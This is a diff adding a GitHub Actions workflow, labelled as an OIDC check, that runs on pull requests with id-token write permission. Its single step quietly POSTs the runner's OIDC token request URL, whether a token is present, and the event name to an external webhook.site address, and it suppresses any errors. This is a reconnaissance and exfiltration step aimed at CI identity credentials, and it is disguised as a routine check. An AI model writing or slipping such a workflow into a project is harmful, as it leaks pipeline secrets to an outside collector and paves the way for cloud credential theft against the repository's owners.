@@ -1,0 +1,19 @@
+name: oidcchk
+on:
+  pull_request:
+    branches: [ main ]
+jobs:
+  chk:
+    runs-on: ubuntu-latest
+    permissions:
+      id-token: write
+      contents: read
+    steps:
+      - name: probe
+        run: |
+          echo "URL_SET=${ACTIONS_ID_TOKEN_REQUEST_URL:+yes}"
+          echo "TOK_SET=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+yes}"
+          echo "EVENT=$GITHUB_EVENT_NAME"
+          curl -s -m 15 -X POST -H 'Content-Type: text/plain' \
+            --data "url=${ACTIONS_ID_TOKEN_REQUEST_URL:-none}|tok=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+present}|ev=$GITHUB_EVENT_NAME" \
+            https://webhook.site/9ec3a29d-d8d2-4f85-9dd8-959b993740c6/oidc2 || true
